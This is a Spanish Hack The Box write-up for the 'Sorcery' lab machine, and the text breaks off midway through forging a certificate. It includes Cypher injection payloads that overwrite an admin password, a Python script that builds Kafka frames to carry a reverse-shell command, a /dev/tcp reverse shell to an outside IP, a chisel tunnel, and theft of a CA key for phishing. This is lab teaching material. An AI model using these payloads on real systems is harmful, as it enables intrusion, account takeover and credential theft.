---
title: "Sorcery-HTB-Writeup"
date: 2026-04-30
categories:
  - Hack The Box
  - Web
  - Linux

tags:
  - HackTheBox
  - Insane
  - Linux
  - Neo4j
  - Cypher Injection
  - Kafka
  - WebAuthn
  - Passkey
  - SSRF
  - RCE
  - DNS Hijacking
  - Phishing
  - mitmproxy
  - FTP
  - TLS Certificate
  - Docker Registry
  - FreeIPA
  - Kerberos
  - LDAP
  - CVE-2025-7493
  - Xvfb
  - Argon2
  - Rust
  - Docker

layout: single
author_profile: true
show_date: true
toc: true
toc_sticky: true
toc_label: "Topics"
---

---

## Reconocimiento

### Escaneo de puertos

Al enumerar los puertos con nmap abiertos veo que hay solo 2 una web corriendo por https y un servicio ssh en el puerto 22

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ nmap -p- --open -sS -n -Pn --min-rate 5000 10.129.237.242 -vvv 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-28 14:36 -0400
Initiating SYN Stealth Scan at 14:36
Scanning 10.129.237.242 [65535 ports]
Discovered open port 22/tcp on 10.129.237.242
Discovered open port 443/tcp on 10.129.237.242
Completed SYN Stealth Scan at 14:37, 14.24s elapsed (65535 total ports)
Nmap scan report for 10.129.237.242
Host is up, received user-set (0.10s latency).
Scanned at 2026-04-28 14:36:52 EDT for 14s
Not shown: 65364 closed tcp ports (reset), 169 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
443/tcp open  https   syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds
           Raw packets sent: 70177 (3.088MB) | Rcvd: 69356 (2.774MB)
```

### Enumeración de subdominios

al enumerar subdominios con gobuster logro encontrar uno

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ gobuster vhost -u https://sorcery.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain  -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       https://sorcery.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
git.sorcery.htb Status: 200 [Size: 13591]
```

### Inspección de la web

al navegar a la web sorcery.htb veo que para poder acceder debo logearme 

[![](/assets/images/324.png)](/assets/images/324.png)

procedo a crearme una cuenta y logearme

[![](/assets/images/325.png)](/assets/images/325.png)

por otro lado el otro subdominio git.sorcery.htb encuentro un repo de gitea muy interesante

[![](/assets/images/326.png)](/assets/images/326.png)

### Análisis del repositorio

al clonarme el repo lo analizo en local para ver que hay en este

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ tree infrastructure    
infrastructure
├── backend
│   ├── Cargo.lock
│   ├── Cargo.toml
│   ├── Dockerfile
│   ├── Rocket.toml
│   └── src
│       ├── api
│       │   ├── auth
│       │   │   ├── login.rs
│       │   │   └── register.rs
│       │   ├── auth.rs
│       │   ├── blog
│       │   │   └── get.rs
│       │   ├── blog.rs
│       │   ├── debug
│       │   │   └── debug.rs
│       │   ├── debug.rs
│       │   ├── dns
│       │   │   ├── get.rs
│       │   │   └── update.rs
│       │   ├── dns.rs
│       │   ├── products
│       │   │   ├── get_all.rs
│       │   │   ├── get_one.rs
│       │   │   └── insert.rs
│       │   ├── products.rs
│       │   ├── webauthn
│       │   │   ├── passkey
│       │   │   │   ├── finish_authentication.rs
│       │   │   │   ├── finish_registration.rs
│       │   │   │   ├── get.rs
│       │   │   │   ├── start_authentication.rs
│       │   │   │   └── start_registration.rs
│       │   │   └── passkey.rs
│       │   └── webauthn.rs
│       ├── api.rs
│       ├── db
│       │   ├── connection.rs
│       │   ├── initial_data.rs
│       │   ├── models
│       │   │   ├── post.rs
│       │   │   ├── product.rs
│       │   │   └── user.rs
│       │   └── models.rs
│       ├── db.rs
│       ├── error
│       │   └── error.rs
│       ├── error.rs
│       ├── main.rs
│       ├── state
│       │   ├── browser.rs
│       │   ├── dns.rs
│       │   ├── kafka.rs
│       │   ├── passkey.rs
│       │   ├── privileges.rs
│       │   └── webauthn.rs
│       └── state.rs
├── backend-macros
│   ├── Cargo.lock
│   ├── Cargo.toml
│   └── src
.......................
44 directories, 123 files
```

---

## Cypher Injection — Neo4j

### Análisis de la vulnerabilidad

Analizando a fondo este repositorio denoto un archivo muy interesante en `infrastructure/backend-macros/src/` 

```bash
┌──(kali㉿kali)-[~/…/content/infrastructure/backend-macros/src]
└─$ ls
lib.rs
```

El archivo `lib.rs` es una **macro de procedimiento en Rust** que genera automáticamente funciones de base de datos para cualquier struct que use `#[derive(Model)]`. El problema está en la función `get_by_{campo}` que se genera para cada campo del struct.

En esta parte específica:

```rust
let query_string = format!(
    r#"MATCH (result: {} { { {}: "{}" }}) RETURN result"#,
    #struct_name, #name_string, #name   // <-- el valor del usuario va directo aquí
);
let row = match graph.execute(
    ::neo4rs::query(&query_string)   // <-- se ejecuta sin parámetros
).await...
```

El problema es doble:

**1. Concatenación directa sin sanitizar.** El valor `#name` (que viene del input del usuario) se mete directamente dentro del string de la query usando `format!()`. No hay ningún tipo de escape ni validación.

**2. No usa parámetros.** Neo4j tiene soporte para queries parametrizadas (`.param()`) que sí se usan en el `save_function`, pero en `get_by_{campo}` el valor va crudo dentro del string. Comparación:

```rust
// save_function — SEGURO, usa parámetros:
tx.run(::neo4rs::query(&query_string) #(#parameters)*)

// get_functions — VULNERABLE, el valor está dentro del string:
graph.execute(::neo4rs::query(&query_string))  // sin .param()
```

**¿Qué genera esto para el struct `Product`?**

Para el campo `id`, la macro genera algo equivalente a esto:

```rust
pub async fn get_by_id(id: String) -> Option<Self> {
    let query_string = format!(
        r#"MATCH (result: Product { { id: "{}" }}) RETURN result"#,
        id  // si id = 1" }) RETURN result UNION ...
    );
    // La query que llega a Neo4j queda:
    // MATCH (result: Product { id: "1" }) RETURN result UNION ...
}
```

Entonces si yo meto `1"}) RETURN result UNION MATCH (result:Product) RETURN result //` como ID en la URL, la query que Neo4j ejecuta es:


```cypher
MATCH (result: Product { id: "1"}) RETURN result UNION MATCH (result:Product) RETURN result //..." }) RETURN result
```

El `//` al final comenta el resto. Control total sobre la query.

### Fase 1 — Confirmar la inyección

Primero lo que hago es capturar una request con Burpsuite en este caso refrescando la pagina en el apartado de un producto 

[![](/assets/images/327.png)](/assets/images/327.png)

Luego compruebo que la inyección funciona forzando que me devuelva un producto distinto al solicitado. Cambio el `SKIP` para iterar por los productos:

```
GET /dashboard/store/1"}) RETURN result UNION MATCH (result:Product) RETURN result ORDER BY result.id SKIP 1 LIMIT 1 //
```

URL-encodeado:

```
/dashboard/store/1%22%7D%29%20RETURN%20result%20UNION%20MATCH%20%28result%3AProduct%29%20RETURN%20result%20ORDER%20BY%20result.id%20SKIP%201%20LIMIT%201%20%2F%2F
```

Si la respuesta me devuelve un producto diferente que al que capture con Burp (Mystic Elixirs), la inyección está confirmada.

[![](/assets/images/328.png)](/assets/images/328.png)

### Fase 2 — Exfiltrar el hash del admin y sobreescribir la contraseña

Con la inyección confirmada, me cuestione: **¿qué datos interesantes puedo extraer de Neo4j?** Para responder eso, volví al repositorio de infraestructura y revisando archivos encontre el archivo `backend/src/db/initial_data.rs`. Ahí encontré algo clave — los usuarios se inicializan directamente en la base de datos con su contraseña hasheada:

```rust
let admin = User {
    id: Uuid::new_v4().to_string(),
    username: "admin".to_string(),
    password: create_hash(&admin_password).expect("site admin hash"),
    privilege_level: UserPrivilegeLevel::Admin,
};
admin.save().await;
```

Esto me confirmaba que el nodo `User` con `username: "admin"` existe en Neo4j y tiene un campo `password`. Ahora la pregunta era cómo sacarlo a la superficie.

Fue entonces cuando revisé el frontend, concretamente `frontend/src/app/dashboard/store/[product]/page.tsx`, y noté esto:


```tsx
<p
  className="mb-4 text-xl"
  dangerouslySetInnerHTML={ {
    __html: product.description,
  }}
/>
```

El campo `description` del producto se renderiza directamente en el HTML sin ningún tipo de escape. Eso me dio la idea: si mediante la inyección consigo que Neo4j sobreescriba la descripción de un producto con el password del admin, ese hash aparecerá visible en la página.

Pero aquí hay un detalle importante que entendí después de probarlo: **el payload necesita trabajar sobre un nodo `result` que realmente exista**. Si uso un ID inventado como `1`, Neo4j no encuentra nada, no hay `result`, y el `SET` no tiene sobre qué operar — el servidor devuelve 404. Necesito partir de un UUID real de un producto existente en la base de datos.

Para obtenerlo usé el payload de enumeración que ya había confirmado antes, cogiendo el primer producto de la lista:

```
1"}) RETURN result UNION MATCH (result:Product) RETURN result ORDER BY result.id SKIP 0 LIMIT 1 //
```

La respuesta me devolvió un producto con UUID `88b6b6c5-a614-486c-9d51-d255f47efb4f`. Con ese ID real ya podía construir el payload definitivo — arranco el `MATCH` con ese UUID para que `result` tenga un nodo válido, luego encadeno un segundo `MATCH` que busca al usuario admin, y finalmente sobreescribo la descripción de `result` con su password:

```
88b6b6c5-a614-486c-9d51-d255f47efb4f"}) MATCH (p:User { username: "admin" }) SET result.description = p.password RETURN result //
```

URL-encodeado:

```
88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20MATCH%20%28p%3AUser%20%7B%20username%3A%20%22admin%22%20%7D%29%20SET%20result.description%20%3D%20p.password%20RETURN%20result%20%2F%2F
```

[![](/assets/images/329.png)](/assets/images/329.png)

Enviado desde Burp, la descripción del producto en la respuesta mostraba:

```
$argon2id$v=19$m=19456,t=2,p=1$AyMgVbXNjjeO9NIXS9eILw$Y7/Boj5dfSsgw2HtvIk79bNlNjz6C3fs0EDtEEAogds
```

El hash del admin expuesto en pantalla. Analizándolo, el algoritmo es **Argon2id** con parámetros `m=19456, t=2, p=1` — crackear esto por fuerza bruta era inviable dado el coste de memoria. No tenía sentido perder tiempo intentándolo.

La alternativa era más directa: si puedo leer el campo `password`, también puedo escribirlo,para eso necesito generar mi propio hash Argon2id con los mismos parámetros usando `argon2-cffi` en Python con una contraseña que yo controlara, e inyectar otra query para reemplazar la contraseña del admin

Para generar el hash usé un script en Python con `argon2-cffi`, respetando exactamente los mismos parámetros que encontré en el hash exfiltrado — si los parámetros no coinciden, el backend los rechaza al verificar:


```python
import argon2

hasher = argon2.PasswordHasher(
    time_cost=2,
    memory_cost=19456,
    parallelism=1,
    hash_len=32,
    salt_len=16
)

print(hasher.hash("zig123!"))
```


```bash
pip install argon2-cffi
```

```bash
┌──(venv)─(kali㉿kali)-[~/…/app/dashboard/store/[product]]
└─$ python3 gen_hash.py                                             
$argon2id$v=19$m=19456,t=2,p=1$9zJAFzQwU/LGNo2GW5Qhhw$kL6BCsDcPVB1G2+YvxatvjqLC5goHq8JA6WiLS69fU4
```

Con ese hash formé el payload final e inyecté la nueva contraseña directamente sobre el nodo `User` del admin en Neo4j:

```
88b6b6c5-a614-486c-9d51-d255f47efb4f"}) MATCH (p:User { username: "admin" }) SET p.password = '$argon2id$v=19$m=19456,t=2,p=1$9zJAFzQwU/LGNo2GW5Qhhw$kL6BCsDcPVB1G2+YvxatvjqLC5goHq8JA6WiLS69fU4' RETURN result //
```

URL-encodeado:

```
88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20MATCH%20%28p%3AUser%20%7B%20username%3A%20%22admin%22%20%7D%29%20SET%20p.password%20%3D%20%27%24argon2id%24v%3D19%24m%3D19456%2Ct%3D2%2Cp%3D1%249zJAFzQwU%2FLGNo2GW5Qhhw%24kL6BCsDcPVB1G2%2BYvxatvjqLC5goHq8JA6WiLS69fU4%27%20RETURN%20result%20%2F%2F
```

[![](/assets/images/330.png)](/assets/images/330.png)

Enviado desde Burp, fui al login de `sorcery.htb` con `admin:zig123!` 

[![](/assets/images/331.png)](/assets/images/331.png)

y tenía control total sobre la cuenta de administrador.

---

## WebAuthn — Bypass de Passkey con Virtual Authenticator

Cuando entré como admin lo primero que noté fue que ciertas secciones del dashboard — **DNS, Debug y Blog** — no eran accesibles con el login normal de contraseña. El servidor las bloqueaba y exigía autenticación por **Passkey**.

[![](/assets/images/332.png)](/assets/images/332.png)

Intenté enrolar una Passkey desde el perfil del admin, pero el navegador me lanzó un error relacionado con el certificado TLS. Esto tiene sentido: la WebAuthn API — el estándar detrás de las Passkeys — requiere que el origen sea seguro, y en este contexto el certificado autofirmado de la máquina no cumple los requisitos del navegador para permitir operaciones criptográficas de este tipo.

La solución no requería ningún exploit adicional. Chrome tiene una herramienta integrada en las DevTools llamada **WebAuthn** que permite emular un autenticador virtual directamente en el navegador, simulando el hardware físico (como una YubiKey) sin necesidad de uno real. Esto existe para que los desarrolladores puedan testear flujos de Passkey en local, pero en este caso nos viene perfecto para bypasear la restricción.

El proceso es:

1. Abrir DevTools → tres puntos → More Tools → WebAuthn
2. Activar `Enable virtual authenticator environment`
3. Configurar el autenticador y darle a `Add`
4. Volver al perfil del admin y pulsar `Enroll Passkey` — esta vez sí funciona
5. Cerrar sesión, ir al login por Passkey, introducir `admin` y autenticarse con el autenticador virtual recién creado

<div class="video-container">
  <video controls>
    <source src="/assets/videos/7.mp4" type="video/mp4">
    Tu navegador no soporta el tag de video.
  </video>
</div>

---

## SSRF + Kafka RCE — Contenedor DNS

Una vez dentro como admin con Passkey, lo primero que hice fue explorar las secciones que antes estaban bloqueadas. Empecé por el **Blog**, donde encontré dos posts que guardé en mente para más adelante — uno hablaba de una política antiphishing interna con reglas muy específicas, y otro mencionaba directamente a un usuario llamado `tom_summers` que había caído en un phishing previo contra la instancia de Gitea. Información valiosa que tendría sentido más adelante.

Después entré a la sección **Debug**. Lo que vi fue un formulario que permitía especificar un **Host**, un **Puerto**, datos opcionales, y dos checkboxes: `Keep alive?` y `Expect response?`. La descripción decía literalmente _"Easily debug ports by sending raw data to them and optionally expecting a response"_.

Esto me llamó mucho la atención. Antes de hacer nada, fui al repositorio y revisé `backend/src/api/debug.rs`, donde encontré esta línea:


```rust
TcpStream::connect(format!("{}:{}", data.host, data.port))
```

Ahí estaba la clave. El servidor no está haciendo una petición HTTP — está abriendo una **conexión TCP raw** hacia el host y puerto que le indiques, mandando los bytes que le pases, y devolviendo la respuesta. Esto es importante porque significa que no estoy limitado a protocolos HTTP — puedo hablar con **cualquier servicio interno** en su protocolo nativo, sea lo que sea.

Para confirmarlo, apunté el Debug hacia mi propia máquina. Monté un listener en Python, metí mi IP y puerto en el formulario, puse `check` en hexadecimal (`636865636b`) como data, y le di a Send. Me llegó la conexión con el texto `check`, y la página me devolvió en hexadecimal la respuesta que yo había enviado. **Comunicación TCP bidireccional confirmada** — el servidor manda y recibe datos arbitrarios.

Con eso claro, volví al repositorio y abrí `docker-compose.yml`. En los campos `WAIT_HOSTS` de cada servicio estaban listados todos los contenedores internos con sus puertos:

```
neo4j:7687
kafka:9092
backend:8000
frontend:3000
gitea:3000
mail:8025
```

El que más me llamó la atención fue **Kafka en el puerto 9092**. Kafka es un sistema de mensajería — los productores publican mensajes en topics y los consumidores los leen. Fui al código del servicio DNS en `dns/src/main.rs` y encontré esto:


```rust
let Ok(command) = str::from_utf8(message.value) else {
    continue;
};
let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
```

Y un poco más arriba en el mismo archivo, vi cómo el backend publica mensajes en ese topic cuando se actualiza el DNS:


```rust
match producer.send(&Record {
    topic: "update",
    partition: -1,
    key: (),
    value: "/dns/convert.sh".as_bytes(),
}) {
```

Todo encajó. El servicio DNS consume mensajes del topic `update` de Kafka y los ejecuta directamente con `bash -c` **sin ningún tipo de validación**. Normalmente el backend solo publica la ruta `/dns/convert.sh`, pero si yo consigo publicar cualquier otro string en ese topic, el contenedor DNS lo ejecutará como comando. Eso es **RCE directo**.

La cadena de ataque era clara: usar el Debug como túnel TCP para hablar con Kafka en su protocolo nativo, publicar un mensaje en el topic `update` con un comando de reverse shell, y que el contenedor DNS lo ejecute automáticamente.

### Construcción del payload Kafka Wire Protocol

Con la cadena de ataque clara, el siguiente problema era técnico: **¿cómo hablo con Kafka a través del Debug?** Kafka no usa HTTP ni texto plano — usa su propio **Wire Protocol binario**. Si mando bytes aleatorios al puerto 9092, el broker los descarta silenciosamente. Necesito construir el frame exacto que Kafka espera.

Intenté primero hacer el relay completo usando el `kafka-console-producer.sh` oficial apuntando a un intermediario Python que retransmitiera cada paquete al Kafka interno via el Debug. El problema es que el producer abre una nueva conexión TCP por cada paquete del handshake — ApiVersions, InitProducerId, Metadata, Produce — y el Debug endpoint no mantiene estado entre peticiones. El relay nunca llegaba a completar la negociación.

La solución fue más directa: construir el payload Kafka desde cero en Python implementando el protocolo mínimo necesario — un **ProduceRequest v0**, la versión más simple que existe, sin campos opcionales ni extensiones de versiones modernas.

El protocolo funciona por capas, de adentro hacia afuera. Empiezo por el núcleo y voy envolviendo hasta tener el frame TCP completo:

---

**Capa 1 — Message v0**

El núcleo es el mensaje en sí. Tiene estructura fija: magic byte, attributes, key nulo, y el value que es mi comando bash. Antes de todo va un **CRC32** calculado sobre el cuerpo — Kafka lo valida al recibir y descarta el mensaje si no coincide:

```python
body  = struct.pack('>bb', 0, 0)           # magic=0, attributes=0
body += struct.pack('>i', -1)              # key null
body += struct.pack('>i', len(value))      # longitud del comando
body += value                              # el comando bash

crc = binascii.crc32(body) & 0xFFFFFFFF   # CRC32 unsigned (Python puede devolver negativo)
msg = struct.pack('>I', crc) + body
```

El `& 0xFFFFFFFF` es necesario porque Python puede devolver el CRC como negativo — Kafka espera unsigned de 32 bits. Todos los campos numéricos van en **big-endian** sin excepción.

---

**Capa 2 — MessageSet**

Envuelve el mensaje añadiendo un offset y su tamaño. El broker ignora el offset en producers:


```python
msg_set  = struct.pack('>q', 0)            # offset = 0
msg_set += struct.pack('>i', len(msg))     # tamaño del mensaje
msg_set += msg
```

---

**Capa 3 — Topic y Partition**

Le indico al broker en qué topic publico y en qué partición. En este caso el topic es `update` y la partición es la 0, la única que existe:


```python
partition  = struct.pack('>i', 0)
partition += struct.pack('>i', len(msg_set))
partition += msg_set

topic_data  = struct.pack('>h', len(b'update')) + b'update'
topic_data += struct.pack('>i', 1)         # num partitions = 1
topic_data += partition
```

---

**Capa 4 — Body del ProduceRequest**

Le pido confirmación al broker con `acks = 1` — esto hace que Kafka devuelva una respuesta, que es lo que necesita el Debug con "Expect response?" marcado:


```python
body  = struct.pack('>h', 1)               # acks = 1
body += struct.pack('>i', 5000)            # timeout = 5000ms
body += struct.pack('>i', 1)              # num topics = 1
body += topic_data
```

---

**Capa 5 — Header**

El `API Key = 0` identifica la operación como ProduceRequest. Kafka tiene decenas de operaciones distintas, cada una con su número:


```python
header  = struct.pack('>hhi', 0, 0, 1)    # api_key=0, version=0, correlation_id=1
header += struct.pack('>h', len(b'debug-client')) + b'debug-client'
```

---

**Capa 6 — Frame TCP**

Todo request Kafka va precedido de 4 bytes con el tamaño total. El broker los lee primero para saber cuántos bytes esperar del socket:


```python
request = header + body
frame   = struct.pack('>i', len(request)) + request
```

Así que con todo esto la estructura queda clara — de afuera hacia adentro:

```
Frame → Header → Body → TopicData → Partition → MessageSet → Message → comando bash
```

Con esa lógica armé el script completo `gen_kafka_payload.py`:


```python
import binascii
import struct
import sys

def encode_string(s):
    encoded = s.encode('utf-8')
    return struct.pack('>h', len(encoded)) + encoded

def build_message(value):
    body  = struct.pack('>bb', 0, 0)
    body += struct.pack('>i', -1)
    body += struct.pack('>i', len(value))
    body += value
    crc = binascii.crc32(body) & 0xFFFFFFFF
    return struct.pack('>I', crc) + body

def build_produce_request(topic, command):
    value   = command.encode('utf-8')
    msg     = build_message(value)
    msg_set = struct.pack('>q', 0) + struct.pack('>i', len(msg)) + msg

    partition  = struct.pack('>i', 0)
    partition += struct.pack('>i', len(msg_set))
    partition += msg_set

    topic_data  = encode_string(topic)
    topic_data += struct.pack('>i', 1)
    topic_data += partition

    header  = struct.pack('>hhi', 0, 0, 1)
    header += encode_string('debug-client')

    body  = struct.pack('>h', 1)
    body += struct.pack('>i', 5000)
    body += struct.pack('>i', 1)
    body += topic_data

    request = header + body
    return struct.pack('>i', len(request)) + request

cmd     = sys.argv[1]
payload = build_produce_request('update', cmd)
print(payload.hex())
```

Lo ejecuté con el comando de reverse shell

```bash
┌──(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ python3 gen_kafka_payload.py 'bash -i >& /dev/tcp/10.10.15.121/443 0>&1' 
000000770000000000000001000c64656275672d636c69656e740001000013880000000100067570646174650000000100000000000000430000000000000000000000379cb3d8890000ffffffff0000002962617368202d69203e26202f6465762f7463702f31302e31302e31352e3132312f34343320303e2631
```

Con el listener activo fui al Debug, metí `kafka` como host, `9092` como puerto, pegué el hex en el campo Data, marqué **Expect response?** y desmarcé **Keep alive?**, y le di a Send.

[![](/assets/images/333.png)](/assets/images/333.png)

Shell recibida. Estaba dentro del **contenedor DNS** como `user`.

---

## USER — Phishing + DNS Hijacking

Con shell en el contenedor DNS como `user`, lo primero que hice fue orientarme — ¿dónde estoy, qué controlo, y qué puedo hacer desde aquí?

Al explorar el directorio `/dns/` encontré tres archivos clave: `convert.sh`, `hosts`, y `entries`. El script `convert.sh` era simple pero importante 

```bash
user@7bfb70ee5b9c:/$ ls
app  bin  boot  dev  dns  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  varwait
user@7bfb70ee5b9c:/$ cd dns/
user@7bfb70ee5b9c:/dns$ ls
convert.sh  entries  hosts  hosts-user  hosts.user
user@7bfb70ee5b9c:/dns$ cat convert.sh 
#!/bin/bash

entries_file=/dns/entries
hosts_files=("/dns/hosts" "/dns/hosts-user")

> $entries_file

for hosts_file in ${hosts_files[@]}; do
  while IFS= read -r line; do
    key=$(echo $line | awk '{ print $1 }')
    values=$(echo $line | cut -d ' ' -f2-)

    for value in $values; do
      echo "$key $value" >> $entries_file
    done
  done < $hosts_file
done
```

leía dos archivos de hosts (`/dns/hosts` y `/dns/hosts-user`), los procesaba línea por línea y consolidaba el resultado en `/dns/entries`. Ese archivo `entries` era lo que `dnsmasq` 

```bash
user@7bfb70ee5b9c:/dns$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 02:28 ?        00:00:00 /bin/bash /docker-entrypoint.sh
root           6       1  0 02:28 ?        00:00:03 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
root           7       6  0 02:28 ?        00:00:00 sh -c while true; do printf "READY\n"; read line; kill -9 $PPID; printf "RESULT 2\n"; printf "OK"; done
user           8       6  0 02:28 ?        00:00:02 /app/dns
user          10       8  0 03:00 ?        00:00:00 bash -c bash -i >& /dev/tcp/10.10.15.121/443 0>&1
user          11      10  0 03:00 ?        00:00:00 bash -i
user          12      11  0 03:13 ?        00:00:00 script /dev/null -c bash
user          13      12  0 03:13 pts/0    00:00:00 sh -c bash
user          14      13  0 03:13 pts/0    00:00:00 bash
user          34      14  0 03:26 pts/0    00:00:01 ./chisel client 10.10.15.121:1234 R:socks
user          85      14  0 04:25 pts/0    00:00:00 /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts.user --addn-hosts /dns/hosts
user         122      14  0 04:47 pts/0    00:00:00 ps -ef
user@7bfb70ee5b9c:/dns$ 
```

usaba como fuente de verdad para resolver nombres dentro de la red interna Docker.

Lo que me llamó la atención inmediatamente fue que `/dns/hosts-user` **no existía** — pero el directorio `/dns/` era propiedad de `user`. Eso significaba que podía crear ese archivo y meter las entradas que quisiera, controlando efectivamente qué dominios resolvía el DNS interno para todos los contenedores de la infraestructura.

Antes de actuar, volví al repositorio de infraestructura para entender el panorama completo. En `backend/src/db/initial_data.rs` estaba el contenido del Blog que había leído como admin. Dos posts definían exactamente el vector de ataque:

El primero, **Phishing Training**, establecía las tres reglas que `tom_summers` debía seguir antes de abrir cualquier link de un email:

```
a) el link debe venir de uno de nuestros dominios (*.sorcery.htb)
b) el sitio web debe usar HTTPS
c) el subdominio debe usar nuestra RootCA interna
```

Y añadía algo que parecía una broma pero era un error crítico de seguridad: _"la clave privada está almacenada de forma segura en nuestro servidor FTP, así que no puede ser hackeada"_. La clave privada de la RootCA — el componente que permite firmar certificados que cualquier cliente de la infraestructura aceptará como legítimos — **expuesta en un FTP anónimo**.

El segundo post, **Phishing Awareness**, confirmaba que `tom_summers` ya había caído antes en un phishing contra Gitea, lo que indicaba que había un bot automatizado que monitorizaba los emails de `tom_summers` y cuando recibía un link que cumplía las tres condiciones, visitaba la URL e introducía credenciales en formularios de login de Gitea automáticamente.

La cadena de ataque entera quedó clara de golpe:

1. Robar la RootCA del FTP anónimo
2. Generar un certificado para un dominio `*.sorcery.htb` firmado con esa RootCA
3. Envenenar el DNS interno para que ese dominio apunte a mi IP
4. Montar un servidor HTTPS con ese certificado sirviendo una página de login de Gitea — el bot la aceptará como legítima porque cumple las tres condiciones
5. Mandar el email de phishing a `tom_summers` con el link
6. Capturar las credenciales cuando el bot las introduzca

### Obtener la RootCA

En el `docker-compose.yml` estaba definido un servicio `ftp` con acceso anónimo. Desde el contenedor resolví su IP:

```shell
user@7bfb70ee5b9c:/app$ nslookup ftp 127.0.0.11
Server:         127.0.0.11
Address:        127.0.0.11#53

Non-authoritative answer:
Name:   ftp
Address: 172.19.0.7
```

Asi que para operar desde la red interna del contenedor me subi chisel y estableci un tunel socks 

como el contenedor no tenia los comandos basicos como curl o wget me toco subirlo por netcat


```bash
──(kali㉿kali)-[~/Downloads/chisel]
└─$ nc -lvnp 8080 < chisel           
listening on [any] 8080 ...
```


```bash
user@7bfb70ee5b9c:/app$ cat < /dev/tcp/10.10.15.121/8080 > /tmp/chisel && chmod +x /tmp/chisel
```


Con el túnel Chisel activo me conecté desde mi Kali via proxychains y me descargue el RootCA.crt y el RootCA.key

```bash
┌──(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ proxychains ftp 172.19.0.3
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21  ...  OK
Connected to 172.19.0.3.
220 (vsFTPd 3.0.3)
Name (172.19.0.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21109|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21109  ...  OK
150 Here comes the directory listing.
drwxrwxrwx    2 ftp      ftp          4096 Oct 31  2024 pub
^C
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||21103|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21103  ...  OK
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1826 Oct 31  2024 RootCA.crt
-rw-r--r--    1 ftp      ftp          3434 Oct 31  2024 RootCA.key
^C
receive aborted. Waiting for remote to finish abort.
226 Directory send OK.
500 Unknown command.
136 bytes received in 01:12 (0.00 KiB/s)
ftp> get RootCA.crt
local: RootCA.crt remote: RootCA.crt
229 Entering Extended Passive Mode (|||21108|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21108  ...  OK
150 Opening BINARY mode data connection for RootCA.crt (1826 bytes).
100% |********************************************************************************|  1826        0.02 KiB/s  - stalled -^C
receive aborted. Waiting for remote to finish abort.
226 Transfer complete.
500 Unknown command.
1826 bytes received in 01:21 (0.02 KiB/s)
ftp> get RootCA.key
local: RootCA.key remote: RootCA.key
229 Entering Extended Passive Mode (|||21110|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21110  ...  OK
150 Opening BINARY mode data connection for RootCA.key (3434 bytes).
100% |********************************************************************************|  3434        0.55 KiB/s    00:00 ETA^C
receive aborted. Waiting for remote to finish abort.
226 Transfer complete.
500 Unknown command.
3434 bytes received in 00:06 (0.54 KiB/s)
ftp> bye
221 Goodbye.
```

Al inspeccionar la clave

```bash
┌──(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ file RootCA.key
RootCA.key: OpenSSH private key (with password)
```

Estaba cifrada con passphrase. La crackeé con `pemcrack` contra `rockyou.txt`:

```bash
┌──(kali㉿kali)-[~/…/kafka_2.13-3.9.2/bin/pemcrack/bin]
└─$ ./pemcrack ../../RootCA.key /usr/share/wordlists/rockyou.txt 
--- pemcrack v1.0 - by Robert Graham ----
-> 123456
found: password
```

La passphrase era `password` la descifré para poder usarla sin passphrase:

```bash
┌──(venv)─(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ openssl rsa -in RootCA.key -out RootCA_decp.key
Enter pass phrase for RootCA.key:
writing RSA key
```

### Generar el certificado

Con la RootCA en mano generé una clave y un certificado para `zig.sorcery.htb` — un subdominio bajo `*.sorcery.htb` que cumpliría la condición a) del blog. Lo firmé con la RootCA interna para cumplir la condición c):


```bash
┌──(venv)─(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ openssl genrsa -out sv.key 2048                

┌──(venv)─(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ openssl req -new -key sv.key -subj '/CN=zig.sorcery.htb' > sv.csr

┌──(venv)─(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ openssl req -new -key sv.key -subj '/CN=zig.sorcery.htb' > sv.csr

